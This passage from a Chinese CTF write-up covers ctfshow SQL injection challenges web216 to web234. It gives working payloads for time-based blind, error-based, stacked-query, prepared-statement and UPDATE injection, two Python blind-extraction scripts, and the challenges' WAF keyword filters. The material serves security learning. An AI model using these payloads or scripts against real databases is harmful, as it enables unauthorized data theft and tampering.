        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>和215一样，改改pl：<code>'MQ==')or(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(2),1)</code>，看了<a target="_blank" rel="noopener" href="https://y4tacker.blog.csdn.net/article/details/110144623">Y4师傅的脚本</a>，不会，呜呜呜，看都看不懂，俺菜死了，建议看看Y4师傅的，俺的遍历跑了4min，Y4师傅的脚本建议多跑两边，我跑了三次，三次都不一样</p>
<h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>sql: <code>where id = ($id);</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">//waf</span>
    <span class="token comment">//屏蔽危险分子</span>
    <span class="token keyword">function</span> <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/sleep/i'</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>时间盲注除了<code>sleep()</code>还有<code>BENCHMARK()</code>，所以把pl的<code>sleep(2)</code>换成<code>BENCHMARK(3500000,md5('yq1ng')</code>即可，这个猜测正确返回时间为2.35S，本地测试很快，一开始传的返回9S，计算了一下取了其1/4值</p>
<blockquote>
<p><code>BENCHMARK(n, exp)</code> –&gt; 测试一些函数的执行速度<br>参数介绍：第一个是执行的次数，第二个是要执行的函数或者是表达式<br>eg:<code>BENCHMARK(3500000,md5('yq1ng')</code>测试md5加密yq1ng 3500000次的时间，依次来达到延时效果</p>
</blockquote>
<h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>好家伙，在上一题基础上过滤了<code>BENCHMARK()</code>，不过还能用笛卡尔积去达到延时效果，参见<a target="_blank" rel="noopener" href="https://www.cnblogs.com/c1e4r/articles/9060525.html">此博客</a>，将<code>BENCHMARK()</code>改为<code>(SELECT count(*) FROM information_schema.columns A, information_schema.schemata B, information_schema.schemata C, information_schema.schemata D,information_schema.schemata E, information_schema.schemata F)</code>即可，延时为1S，可以自己先测测再用</p>
<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>这次屏蔽了<code>rlike</code>，上题思路应该是用正则匹配来达到延时效果，例如：<code>select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');</code>，本地测试出现<code>ERROR 3699 (HY000): Timeout exceeded in regular expression match.</code>，故未使用，本方法参见<a target="_blank" rel="noopener" href="https://www.cdxy.me/?p=789">MySQL时间盲注五种延时方法</a><br>还是上题脚本，给个参考，表名：<code>ctfshow_flagxca</code>，列名：<code>flagaabc</code>，flag一共42位，格式：<code>flag{3b75b8d2-fe1b-4e47-a2db-70cc9c8e2091}</code>，一遍可能不成功，多试几次，我试了六七次呜呜呜，再也不想做时间盲注了，截取单个字符一直不行可以试试<code>left()</code>每次截取少量字符串，多试几次，奥里给<br>给出参考表名：<code>ctfshow_flagxcac</code>，列名：<code>flagaabcc</code></p>
<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>最后一题盲注了，过滤挺多：<code>preg_match('/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i',$str);</code>看来上一题的姿势挺多的，俺想不出来预期解，所以还是上一题脚本，等群主出预期，占坑</p>
<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><p>sql：<code>$sql = select * from ctfshow_user limit ($page-1)*$limit,$limit;</code><br>无过滤，提示：<code>//拿到数据库名字就算你赢</code><br>参考<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">P牛文章</a><br>在<code>LIMIT</code>后面可以跟两个函数，<code>PROCEDURE</code> 和 <code>INTO</code>，into需要写权限，一般不常见，但是<code>PROCEDURE</code>在msyql5.7以后已经弃用，8.0直接删除了。。。<a target="_blank" rel="noopener" href="https://www.docs4dev.com/docs/zh/mysql/5.7/reference/procedure-analyse.html">官方文档在此</a><br>payload：<code>URL/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code>，数据库名就是flag</p>
<h2 id="web222-223"><a href="#web222-223" class="headerlink" title="web222 | 223"></a>web222 | 223</h2><p>我的脚本删了，幸好space man师傅还留着，在此感谢</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
<span class="token comment"># @Author:  yq1ng</span>
<span class="token comment"># @Date:    2020-11-17 17:30</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> time

url <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Okay, Input your url: "</span><span class="token punctuation">)</span>

tb_name <span class="token operator">=</span> <span class="token string">''</span>
all_column_len<span class="token operator">=</span><span class="token number">0</span>
column_name <span class="token operator">=</span> <span class="token string">''</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">def</span> <span class="token function">creat_num</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    ret <span class="token operator">=</span> <span class="token string">"y"</span>
    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
        ret <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">elif</span> n <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> ret
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            ret <span class="token operator">+=</span> <span class="token string">"y"</span>
    <span class="token keyword">return</span> ret


<span class="token comment">#table_name</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGetting the table name..."</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment"># 不晓得有多少，尽量大喽，当然，while true也行</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'ctfshow_abdegijklmnopqruvxyz-,0123456789!'</span><span class="token punctuation">:</span><span class="token comment"># 根据命名规则，表名是不会有！的，所以嘿嘿</span>
        payload <span class="token operator">=</span> <span class="token string">'?u=id having (select mid(group_concat(table_name),length("%s"),length("y")) from information_schema.tables where table_schema=database())="%c"'</span><span class="token operator">%</span> <span class="token punctuation">(</span>creat_num<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u67e5\u8be2\u6210\u529f"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            tb_name <span class="token operator">+=</span> y
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]table name is %s"</span><span class="token operator">%</span> tb_name<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token string">"!"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\n\nDone!The table names in this database are："</span><span class="token punctuation">,</span>tb_name<span class="token punctuation">)</span>

guess_tbName <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\nPlease enter the name of the table you want to guess: "</span><span class="token punctuation">)</span>
<span class="token comment">#column_name</span>
<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'abcdefghijklmnopqrstuvwxyz_,!'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">'?u=id having (select mid(group_concat(column_name),length("%s"),length("y")) from information_schema.columns where table_name="%s")="%c"'</span><span class="token operator">%</span> <span class="token punctuation">(</span>creat_num<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>guess_tbName<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
        <span class="token comment">#print(payload)</span>
        <span class="token keyword">if</span> <span class="token string">r"\u67e5\u8be2\u6210\u529f"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            column_name <span class="token operator">+=</span> y
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The column name in the %s table is %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>guess_tbName<span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> y <span class="token operator">==</span> <span class="token string">"!"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

guess_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n\nOkay, we're getting a flag. Tell me the list:"</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">'?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s) REGEXP "[a-z]|{|}|-"'</span><span class="token operator">%</span> <span class="token punctuation">(</span>guess_flag<span class="token punctuation">,</span>creat_num<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>guess_tbName<span class="token punctuation">)</span>
    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
    <span class="token comment">#print(payload)</span>
    <span class="token keyword">if</span> <span class="token string">r"\u67e5\u8be2\u6210\u529f"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'flag{bcde-hijkmnopqrstuvwxyz}'</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token string">'?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s)="%c"'</span><span class="token operator">%</span> <span class="token punctuation">(</span>guess_flag<span class="token punctuation">,</span>creat_num<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>guess_tbName<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
            <span class="token comment">#print(payload)</span>
            <span class="token keyword">if</span> <span class="token string">r"\u67e5\u8be2\u6210\u529f"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> y
                <span class="token keyword">break</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> y <span class="token keyword">in</span> <span class="token string">r'1234567890'</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token string">'?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s)=length("%s")'</span><span class="token operator">%</span> <span class="token punctuation">(</span>guess_flag<span class="token punctuation">,</span>creat_num<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span>guess_tbName<span class="token punctuation">,</span>creat_num<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
            r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url <span class="token operator">+</span> payload<span class="token punctuation">)</span>
            <span class="token comment">#print(payload)</span>
            <span class="token keyword">if</span> <span class="token string">r"\u67e5\u8be2\u6210\u529f"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
                flag <span class="token operator">+=</span> y
                <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The flag is %s"</span><span class="token operator">%</span> flag<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token string">"}"</span> <span class="token keyword">in</span> flag<span class="token punctuation">:</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5">Y1ng</a>大师傅博客</p>
</blockquote>
<p>用的群里师傅的，payload，可以去下载一波~~，不多解释啦</p>
<h2 id="web226"><a href="#web226" class="headerlink" title="web226"></a>web226</h2><blockquote>
<p>堆叠<br>sql: <code>$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";</code><br>waf: <code>preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)</code></p>
</blockquote>
<p>预编译淦，引用自<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/36f0772f5ce8">简简的我</a></p>
<blockquote>
<p><code>PREPARE name from '[my sql sequece]';</code> –&gt; 预定义SQL语句<br><code>EXECUTE name;</code> –&gt; 执行预定义SQL语句<br><code>(DEALLOCATE || DROP) PREPARE name;</code> –&gt; 删除预定义SQL语句</p>
</blockquote>
<blockquote>
<p>预编译也能用变量<br><code>SET @tn = 'hahaha';</code>  //存储表名<br><code>SET @sql = concat('select * from ', @tn);</code>  //存储SQL语句<br><code>PREPARE name from @sql;</code>   //预定义SQL语句<br><code>EXECUTE name;</code>  //执行预定义SQL语句<br><code>(DEALLOCATE || DROP) PREPARE sqla;</code>  //删除预定义SQL语句</p>
</blockquote>
<p>但是ban了set，变量凉凉<br>先查表：<code>user1';show tables;#</code><br>payload1: <code>user1';PREPARE yq1ng from concat(char(115,101,108,101,99,116), ' * from `ctfshow_flagasa` ');EXECUTE yq1ng;#</code><br>注：<code>char(115,101,108,101,99,116)&lt;-----&gt;'select'</code><br>payload2: <code>user1';PREPARE yq1ng from concat('s','elect', ' * from `ctfshow_flagasa` ');EXECUTE yq1ng;#</code></p>
<h2 id="web226-1"><a href="#web226-1" class="headerlink" title="web226"></a>web226</h2><p>sql: <code>$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";</code><br>waf: <code>preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i',$username)</code><br>还好，上一条hex编码就好了，记得前面加个0x；<br>查表：<code>?username=user1';PREPARE yq1ng from 0x73686F77207461626C6573;EXECUTE yq1ng;#</code> –&gt; <code>hex("show tables")</code><br>flag：<code>?username=user1';PREPARE yq1ng from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE yq1ng;#</code></p>
<h2 id="web227"><a href="#web227" class="headerlink" title="web227"></a>web227</h2><blockquote>
<p>MySQL的存储过程<br>建议先看两个参考:<br><a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/mysql-stored-procedure.html">MySQL 存储过程介绍</a>,<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41573234/article/details/80411079">MySQL—查看存储过程和函数</a></p>
</blockquote>
<p>照群主的话说就是flag即在表内又不在表内<br>先看表，和上一题一样，接着。。。把表翻了一遍没flag，问了群主是存储过程，Google无果，给了payload：<code>1';call getFlag();</code><br>然后查<code>call</code>，找到上述两篇链接，本地也复现了一下，也是类似预编译，用户自定义函数再去调用，直接<code>SELECT   *   FROM   information_schema.Routines</code>可以发现所有自定函数及内容，payload：<code>?username=1';PREPARE yq1ng from 0x53454C4543542020202A20202046524F4D202020696E666F726D6174696F6E5F736368656D612E526F7574696E6573;EXECUTE yq1ng;#</code><br>本题也算是初步认识了存储过程，以后再遇见也有点谱，复现记录：</p>
<pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">mysql&gt; delimiter $$ //临时定义结束符为$$
mysql&gt; create procedure test() //创建函数
    -&gt; begin //开始
    -&gt;     select "flag{test}"; //语句
    -&gt; end$$ //结束+结束符
Query OK, 0 rows affected (0.36 sec)
mysql&gt; delimiter ; //将结束符改为;
mysql&gt; call test(); //调用定义函数
+------------+
| flag{test} |
+------------+
| flag{test} |
+------------+
1 row in set (0.07 sec)

Query OK, 0 rows affected (0.07 sec)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web228-229-230"><a href="#web228-229-230" class="headerlink" title="web228 | 229 |230"></a>web228 | 229 |230</h2><pre class="line-numbers language-none"><code class="language-none">sql
//分页查询
$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
$bansql = "select char from banlist;";<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">waf
//师傅说内容太多，就写入数据库保存
if(count($banlist)&gt;0){
foreach ($banlist as $char) {
    if(preg_match("/".$char."/i", $username)){
    die(json_encode($ret));
    }
}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>和226一样的套路，通杀了。。。主要是sql和waf不太一样，所有没放一起</p>
<p>过滤挺多，懒得解码了：<code>{"id":"2","username":"user1","pass":"111"},{"id":"1","char":"union"},{"id":"2","char":"file"},{"id":"3","char":"into"},{"id":"4","char":"handler"},{"id":"5","char":"db"},{"id":"6","char":"select"},{"id":"7","char":"update"},{"id":"8","char":"dump"},{"id":"9","char":"delete"},{"id":"10","char":"create"},{"id":"11","char":"drop"},{"id":"12","char":"show"},{"id":"13","char":"describe"},{"id":"14","char":"set"},{"id":"15","char":"alter"}</code></p>
<h2 id="web231-232"><a href="#web231-232" class="headerlink" title="web231 | 232"></a>web231 | 232</h2><p>第一次写update注入，才知道不能直接将查询结果进行赋值，<a target="_blank" rel="noopener" href="https://www.cnblogs.com/duanxz/p/5099030.html">详见此</a>，这种思路。。真骚</p>
<p>sql: <code>$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";</code></p>
<p>表名: <code>',username=(select yq1ng.a from (select group_concat(table_name)a from information_schema.tables where table_schema=database()) yq1ng) where username="user1";#</code> –&gt; banlist,ctfshow_user,flaga</p>
<p>列名：<code>',username=(select yq1ng.a from (select group_concat(column_name)a from information_schema.columns where table_name="flaga") yq1ng) where username="user1";#</code> –&gt; id,flagas,info</p>
<p>flag: <code>',username=(select yq1ng.a from (select group_concat(flagas)a from flaga) yq1ng) where username="user1";#</code></p>
<h2 id="web233"><a href="#web233" class="headerlink" title="web233"></a>web233</h2><p>掉进坑里了，思路还在前两题，感谢飞鱼和space man师傅的思路，时间盲注，写的乱乱的，有时间整理一个函数，简洁一点</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># encoding: utf-8</span>
<span class="token comment"># @Author:  yq1ng</span>
<span class="token comment"># @Date:    2020-11-20 23:00</span>

<span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://059e89aa-6633-4b85-a554-dea3e2b48d9a.chall.ctf.show/api/"</span>
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">}</span>
tb_name <span class="token operator">=</span> <span class="token string">''</span>
column_name <span class="token operator">=</span> <span class="token string">''</span>
flag <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'ctfshow_abdegijklmnopqruvxyz-,1234567890!'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"user1'and(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(2),1))and'1'='1"</span><span class="token operator">%</span> <span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        time <span class="token operator">=</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#print(time)#获取响应时间</span>
        <span class="token keyword">if</span> time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            tb_name <span class="token operator">+=</span> j
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]table name is %s"</span><span class="token operator">%</span> tb_name<span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"!"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

guess_tbName <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\nPlease enter the name of the table you want to guess: "</span><span class="token punctuation">)</span>
<span class="token comment">#column_name</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'abcdefghijklmnopqrstuvwxyz_,1234567890!'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"user1'and(if(substr((select group_concat(column_name) from information_schema.columns where table_name='%s'),%d,1)='%c',sleep(2),1))and'1'='1"</span><span class="token operator">%</span> <span class="token punctuation">(</span>guess_tbName<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        time <span class="token operator">=</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#print(time)#获取响应时间</span>
        <span class="token keyword">if</span> time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            tb_name <span class="token operator">+=</span> j
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The column name in the %s table is %s"</span><span class="token operator">%</span><span class="token punctuation">(</span>guess_tbName<span class="token punctuation">,</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span> end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"!"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span>

guess_flag <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"\n\nOkay, we're getting a flag. Tell me the list:"</span><span class="token punctuation">)</span>
<span class="token comment">#flag</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\nGetting the flag......"</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token string">r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}'</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">"user1'and(if(substr((select %s from %s),%d,1)='%c',sleep(2),1))and'1'='1"</span><span class="token operator">%</span> <span class="token punctuation">(</span>guess_flag<span class="token punctuation">,</span>guess_tbName<span class="token punctuation">,</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
        data<span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span> <span class="token operator">=</span> payload
        <span class="token comment">#print(data)</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data <span class="token operator">=</span> data<span class="token punctuation">)</span>
        time <span class="token operator">=</span> r<span class="token punctuation">.</span>elapsed<span class="token punctuation">.</span>total_seconds<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token comment">#print(time)#获取响应时间</span>
        <span class="token keyword">if</span> time <span class="token operator">&gt;</span> <span class="token number">2</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> j
            <span class="token keyword">break</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"\r[+]The flag is %s"</span><span class="token operator">%</span> flag<span class="token punctuation">,</span>end <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token string">"}"</span><span class="token punctuation">:</span>
        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="web234"><a href="#web234" class="headerlink" title="web234"></a>web234</h2><p>sql：<code>$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";</code><br>说是没过滤，其实单引号没了。。。永远不要相信出题人的话，在<a href="https://yq1ng.github.io/z_post/BJDCTF-2nd%20WEB/#bjdctf-2nd%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5">BJDCTF 2nd的简单注入</a>一题中提到过单引号逃逸，当输入的pass为<code>\</code>时，sql语句变为：<code>update ctfshow_user set pass = '\' where username = 'user1';</code>，此时pass为<code>where username = </code>实现单引号逃逸<br>payload：查表：<code>password=\&amp;username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())#</code>，注意，这会把所有的user和pass全部改掉，实际注入加上where或者盲注<br>查列：<code>password=\&amp;username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#</code><br>flag：<code>password=\&amp;username=,username=(select flagass23s3 from flag23a)#</code></p>
